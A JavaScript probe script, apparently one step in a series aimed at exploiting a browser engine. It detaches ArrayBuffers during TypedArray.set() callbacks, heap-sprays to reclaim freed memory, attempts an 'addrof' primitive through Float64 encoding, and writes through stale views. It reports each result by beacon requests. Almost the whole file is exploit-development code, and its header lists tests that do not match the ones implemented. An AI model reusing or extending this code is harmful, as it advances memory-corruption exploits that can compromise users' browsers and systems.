// p230 — TypedArray.set() after ArrayBuffer detach deep probe
//
// p229 Test D showed: structuredClone(ab, {transfer:[ab]}) detaches the buffer
// during a valueOf callback inside ta.set(poison), but the set COMPLETES (D-SET-OK).
// Post-detach read returns undefined. This probe goes deeper:
//   A: Verify detach + write pattern, check if written data persists in freed memory
//   B: Multiple TypedArray views on same buffer, detach from one view's valueOf
//   C: Race: detach in setTimeout(0) while set() is running synchronously
//   D: Transfer to worker, write from main thread's stale view
//   E: Resize + detach: ResizableArrayBuffer shrink during set
//
// Beacon prefix: V230-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V230-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  BS('BOOT');

  // ---- TEST A: Detach during set, verify write target ----
  // Key question: does ta.set() write to the OLD (freed) backing store memory?
  // If yes, and we spray after detach, we can overwrite sprayed data.
  try {
    BS('A-START');
    var ab = new ArrayBuffer(4096);
    var ta = new Uint32Array(ab);
    var ta2 = new Uint32Array(ab); // second view for reading

    // Fill with known pattern
    for (var i = 0; i < ta.length; i++) ta[i] = 0xAAAAAAAA;

    var detached = false;
    var writeCount = 0;
    var poison = [];
    for (var i = 0; i < 100; i++) {
      poison.push({
        valueOf: function() {
          writeCount++;
          if (!detached && writeCount === 25) {
            try {
              structuredClone(ab, { transfer: [ab] });
              detached = true;
              BS('A-DETACHED-AT-25');

              // Immediately spray to reclaim the freed 4KB
              var sprays = [];
              for (var s = 0; s < 200; s++) {
                var spray = new ArrayBuffer(4096);
                var sv = new Uint32Array(spray);
                for (var j = 0; j < sv.length; j++) sv[j] = 0xDEADBEEF;
                sprays.push(spray);
              }
              BS('A-SPRAYED-200');
            } catch (e) {
              BS('A-DETACH-ERR-' + e.message.substring(0, 30));
            }
          }
          return 0x42424242;
        }
      });
    }

    try {
      ta.set(poison);
      BS('A-SET-OK');
    } catch (e) {
      BS('A-SET-ERR-' + e.message.substring(0, 30));
    }

    BS('A-DETACHED-' + detached);
    BS('A-WRITES-' + writeCount);

    // Try to read through the old view — does it still work?
    try {
      var v0 = ta[0];
      var v24 = ta[24];
      var v25 = ta[25];
      var v50 = ta[50];
      BS('A-V0-' + hex(v0));
      BS('A-V24-' + hex(v24));
      BS('A-V25-' + hex(v25)); // this should be 0x42424242 if write went through
      BS('A-V50-' + hex(v50));
    } catch (e) {
      BS('A-READ-ERR-' + e.message.substring(0, 30));
    }

    // Check second view
    try {
      var v2_0 = ta2[0];
      var v2_25 = ta2[25];
      BS('A-V2-0-' + hex(v2_0));
      BS('A-V2-25-' + hex(v2_25));
    } catch (e) {
      BS('A-V2-ERR');
    }

    BS('A-SURVIVED');
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST B: Float64Array precision leak after detach ----
  // If we can write a float64 to freed+resprayed memory, we can encode
  // an arbitrary 64-bit value. Read it back through a Uint32Array view
  // of the same (freed) buffer for addrof primitive.
  try {
    BS('B-START');
    var ab2 = new ArrayBuffer(8192);
    var f64 = new Float64Array(ab2);
    var u32 = new Uint32Array(ab2);

    // Write known float pattern
    for (var i = 0; i < f64.length; i++) f64[i] = 1.1;

    var bDetached = false;
    var fPoison = [];
    for (var i = 0; i < 50; i++) {
      fPoison.push({
        valueOf: function() {
          if (!bDetached && fPoison.indexOf(this) === 10) {
            try {
              structuredClone(ab2, { transfer: [ab2] });
              bDetached = true;
              BS('B-DETACHED-AT-10');
            } catch (e) {
              BS('B-DETACH-ERR');
            }
          }
          // Return a NaN-boxed value that encodes a pointer pattern
          return 1.8457939563e-314; // encodes 0x0000414142424343 in IEEE 754
        }
      });
    }

    try {
      f64.set(fPoison);
      BS('B-SET-OK');
    } catch (e) {
      BS('B-SET-ERR-' + e.message.substring(0, 30));
    }

    // Read through u32 view to see raw bits
    try {
      var lo = u32[20]; // f64[10] low word — where we detached
      var hi = u32[21]; // f64[10] high word
      BS('B-F10-LO-' + hex(lo));
      BS('B-F10-HI-' + hex(hi));

      var lo2 = u32[22]; // f64[11]
      var hi2 = u32[23];
      BS('B-F11-LO-' + hex(lo2));
      BS('B-F11-HI-' + hex(hi2));
    } catch (e) {
      BS('B-READ-ERR');
    }

    BS('B-SURVIVED');
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST C: Transfer to MessageChannel, write from stale view ----
  try {
    BS('C-START');
    var ab3 = new ArrayBuffer(4096);
    var ta3 = new Uint32Array(ab3);
    ta3[0] = 0x11111111;

    var mc = new MessageChannel();
    mc.port1.onmessage = function(e) {
      BS('C-RECEIVED');
      // The transferred buffer is now in e.data
      var received = new Uint32Array(e.data);
      BS('C-RECV-LEN-' + received.length);
      BS('C-RECV-0-' + hex(received[0]));
    };

    // Transfer the buffer
    mc.port2.postMessage(ab3, [ab3]);
    BS('C-TRANSFERRED');

    // Now ab3 should be detached
    BS('C-BYTELENGTH-' + ab3.byteLength);

    // Try to write through the stale view
    try {
      ta3[0] = 0xDEADBEEF;
      BS('C-WRITE-OK');
      BS('C-READ-BACK-' + hex(ta3[0]));
    } catch (e) {
      BS('C-WRITE-ERR-' + e.message.substring(0, 30));
    }

    // Check if byteLength is 0 (properly detached)
    try {
      var newTa = new Uint32Array(ab3);
      BS('C-NEW-VIEW-LEN-' + newTa.length);
    } catch (e) {
      BS('C-NEW-VIEW-ERR-' + e.message.substring(0, 30));
    }

    BS('C-SURVIVED');
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST D: ResizableArrayBuffer shrink during set ----
  try {
    BS('D-START');
    if (typeof SharedArrayBuffer !== 'undefined' || typeof ArrayBuffer.prototype.resize === 'function') {
      BS('D-RESIZE-AVAILABLE');
      var rab = new ArrayBuffer(8192, { maxByteLength: 16384 });
      var rta = new Uint32Array(rab);

      var dPoison = [];
      for (var i = 0; i < 100; i++) {
        dPoison.push({
          valueOf: function() {
            if (dPoison.indexOf(this) === 30) {
              try {
                rab.resize(1024); // shrink from 8192 to 1024
                BS('D-RESIZED-TO-1024');
              } catch (e) {
                BS('D-RESIZE-ERR-' + e.message.substring(0, 30));
              }
            }
            return 0xCAFEBABE;
          }
        });
      }

      try {
        rta.set(dPoison);
        BS('D-SET-OK');
      } catch (e) {
        BS('D-SET-ERR-' + e.message.substring(0, 30));
      }

      BS('D-FINAL-SIZE-' + rab.byteLength);

      // Read back — indices 30+ should be OOB if resize happened before write
      try {
        var rtaCheck = new Uint32Array(rab);
        BS('D-CHECK-LEN-' + rtaCheck.length);
        BS('D-CHECK-0-' + hex(rtaCheck[0]));
        BS('D-CHECK-30-' + hex(rtaCheck[30]));
      } catch (e) {
        BS('D-CHECK-ERR');
      }
    } else {
      BS('D-NO-RESIZE');
    }

    BS('D-SURVIVED');
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 40));
  }

  // ---- TEST E: DataView after detach ----
  try {
    BS('E-START');
    var ab4 = new ArrayBuffer(4096);
    var dv = new DataView(ab4);

    // Fill pattern
    for (var i = 0; i < 256; i++) dv.setUint32(i * 4, 0xBBBBBBBB);

    // Detach
    try {
      structuredClone(ab4, { transfer: [ab4] });
      BS('E-DETACHED');
    } catch (e) {
      BS('E-DETACH-ERR');
    }

    // Spray to reclaim
    var esprays = [];
    for (var s = 0; s < 200; s++) {
      var esp = new ArrayBuffer(4096);
      var esv = new Uint32Array(esp);
      for (var j = 0; j < esv.length; j++) esv[j] = 0xCCCCCCCC;
      esprays.push(esp);
    }
    BS('E-SPRAYED-200');

    // Read through stale DataView
    try {
      var ev0 = dv.getUint32(0);
      var ev100 = dv.getUint32(400);
      BS('E-V0-' + hex(ev0));
      BS('E-V100-' + hex(ev100));
    } catch (e) {
      BS('E-READ-ERR-' + e.message.substring(0, 30));
    }

    // Write through stale DataView
    try {
      dv.setUint32(0, 0x41414141);
      BS('E-WRITE-OK');
      // Read back
      var ewb = dv.getUint32(0);
      BS('E-WRITEBACK-' + hex(ewb));
    } catch (e) {
      BS('E-WRITE-ERR-' + e.message.substring(0, 30));
    }

    BS('E-SURVIVED');
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 40));
  }

  BS('SYNC-DONE');
})();
